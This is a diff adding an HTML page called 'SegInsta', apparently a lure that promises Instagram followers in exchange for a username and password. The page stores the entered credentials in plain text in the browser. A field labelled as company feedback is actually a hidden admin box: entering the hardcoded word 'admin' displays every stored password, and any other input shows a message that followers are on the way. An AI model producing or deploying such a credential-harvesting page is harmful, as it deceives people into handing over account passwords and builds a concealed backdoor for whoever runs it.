@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SegInsta</title>
+    <style>
+        /* Estilos mantidos do site original */
+        body {
+            background: linear-gradient(to right, #f75cc8, #8200fc);
+            /* Gradiente rosa para roxo escuro */
+            color: #000;
+            /* Texto preto */
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #form-container {
+            width: 300px;
+            background: #ffffff;
+            /* Cinza */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            color: #000;
+            /* Texto preto */
+        }
+
+        #user-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            margin-bottom: 5px;
+        }
+
+        input {
+            margin-bottom: 15px;
+            padding: 8px;
+            border: 1px solid #000;
+            /* Borda preta */
+            border-radius: 5px;
+        }
+
+        button {
+            background: #4169E1;
+            /* Azul */
+            color: #FFF;
+            /* Texto branco */
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background: #000080;
+            /* Azul mais escuro no hover */
+        }
+
+        #senha-message {
+            margin-top: 10px;
+            white-space: pre-wrap;
+            /* Para manter quebras de linha */
+        }
+    </style>
+</head>
+
+<body>
+    <div id="form-container">
+        <h2>Cadastro de Usuário</h2>
+        <form id="user-form">
+            <label for="username">Usuário:</label>
+            <input type="text" id="username" name="username" required>
+
+            <label for="password">Senha:</label>
+            <input type="password" id="password" name="password" required>
+
+            <button type="button" onclick="cadastrarUsuario()">Cadastrar</button>
+
+
+            <input type="password" id="adminPassword" name="adminPassword"
+                placeholder="O que você achou da nossa empresa?">
+            <button type="button" onclick="exibirSenhasArmazenadas()">Enviar Feedback</button>
+            <p id="senha-message"></p>
+        </form>
+    </div>
+
+    <script>
+        var usuarios = JSON.parse(localStorage.getItem('usuarios')) || [];
+
+        function cadastrarUsuario() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            usuarios.push({ username, password });
+
+            // Verifica se há mais de 5 usuários e remove os mais antigos
+            if (usuarios.length > 5) {
+                usuarios = usuarios.slice(-5);
+            }
+
+            localStorage.setItem('usuarios', JSON.stringify(usuarios));
+
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+
+            alert("Usuário cadastrado com sucesso!");
+        }
+
+        function exibirSenhasArmazenadas() {
+            var adminPassword = document.getElementById('adminPassword').value;
+
+            // Verifica se a senha de admin está correta
+            if (adminPassword === "admin") {
+                var senhaMessage = document.getElementById('senha-message');
+                senhaMessage.textContent = "";
+
+                // Exibe as senhas armazenadas
+                usuarios.forEach(user => {
+                    senhaMessage.textContent += `Usuário: ${user.username}, Senha: ${user.password}\n`;
+                });
+
+            } else {
+                alert("Concluído. Você já está ganhando os seguidores!");
+            }
+        }
+    </script>
+</body>
+
+</html>
